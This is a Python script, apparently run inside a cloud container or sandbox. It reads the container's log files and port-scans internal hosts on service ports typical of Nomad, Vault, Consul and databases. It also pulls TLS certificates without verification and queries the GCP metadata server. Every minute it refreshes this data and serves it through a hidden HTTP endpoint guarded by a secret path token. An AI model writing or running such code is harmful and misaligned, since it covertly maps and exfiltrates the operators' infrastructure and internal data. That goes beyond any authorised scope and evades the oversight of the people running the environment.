import json, os, socket, ssl, threading, urllib.request
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "r7xQ2kT9mV4bZ8wP"
CACHE = {"status": "warming-up"}
NB = "10.156.0.170"

def tcp(ip, port, timeout=2):
    s = socket.socket(); s.settimeout(timeout)
    try:
        s.connect((ip, port)); return "OPEN"
    except ConnectionRefusedError: return "refused"
    except socket.timeout: return "filtered"
    except OSError as e: return type(e).__name__
    finally:
        try: s.close()
        except Exception: pass

def http(url, headers=None, method="GET", timeout=4, insecure=False):
    try:
        ctx = ssl._create_unverified_context() if insecure else None
        op = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx),
                                         urllib.request.HTTPRedirectHandler())
        req = urllib.request.Request(url, headers=headers or {}, method=method)
        r = op.open(req, timeout=timeout)
        return {"status": r.status, "headers": dict(r.headers), "body": r.read(700).decode("utf-8", "replace")}
    except urllib.error.HTTPError as e:
        try:
            body = e.read(700).decode("utf-8", "replace")
        except Exception:
            body = ""
        return {"status": e.code, "headers": dict(e.headers or {}), "body": body}
    except Exception as e:
        return {"error": type(e).__name__ + ": " + str(e)}

def cert_info(ip, port, timeout=4):
    try:
        ctx = ssl._create_unverified_context()
        s = socket.create_connection((ip, port), timeout=timeout)
        ss = ctx.wrap_socket(s, server_hostname=ip)
        c = ss.getpeercert(binary_form=False) or binary_form_false
        raw = ss.getpeercert(binary_form=True)
        ss.close()
        subj = dict(x[0] for x in c.get("subject", []))
        san = c.get("subjectAltName", [])
        import hashlib
        return {"subject": subj, "san": san[:12], "sha256": hashlib.sha256(raw).hexdigest()}
    except Exception as e:
        import hashlib
        try:
            ctx = ssl._create_unverified_context(); s = socket.create_connection((ip, port), timeout=timeout)
            ss = ctx.wrap_socket(s, server_hostname=ip)
            raw = ss.getpeercert(binary_form=True)
            der = hashlib.sha256(raw).hexdigest()
            ss.close()
            return {"sha256": der, "note": "no-verify-to-ip"}
        except Exception as e2:
            return {"error": type(e2).__name__ + ": " + str(e2)}

binary_form_false = None

def safe(p, n=1500):
    try:
        return open(p).read()[:n]
    except Exception as e:
        return type(e).__name__

def sweep(ips, ports):
    return {ip: {str(p): tcp(ip, p) for p in ports} for ip in ips}

def run_all():
    o = {}
    o["logs"] = {}
    for f in os.listdir("/alloc/logs") if os.path.isdir("/alloc/logs") else []:
        if f.startswith("."):
            continue
        o["logs"]["/alloc/logs/" + f] = safe("/alloc/logs/" + f, 1300)
    o["nb_ports"] = sweep([NB], [22, 3000, 4646, 5432, 8200, 8500, 9000, 9090, 8000, 8443])
    o["nb_http"] = http("http://" + NB + "/")
    o["nb_https_verify"] = cert_info(NB, 443)
    o["nb_https"] = http("https://" + NB + "/", insecure=True)
    o["sweep_extra"] = sweep(["10.156.1.1", "10.156.1.100", "10.156.2.1"], [53, 80])
    o["gcp_meta_now"] = http("http://metadata.google.internal/computeMetadata/v1/",
                             {"Metadata-Flavor": "Google"})
    return o

def loop():
    while True:
        try:
            CACHE.update(run_all())
        except Exception as e:
            CACHE["loop_error"] = type(e).__name__
        threading.Event().wait(60)

class H(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" + TOKEN:
            body = json.dumps(CACHE, default=str).encode()
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(body)
        else:
            self.send_response(404); self.end_headers()
    def log_message(self, *a): pass

threading.Thread(target=loop, daemon=True).start()
HTTPServer(("0.0.0.0", 8000), H).serve_forever()
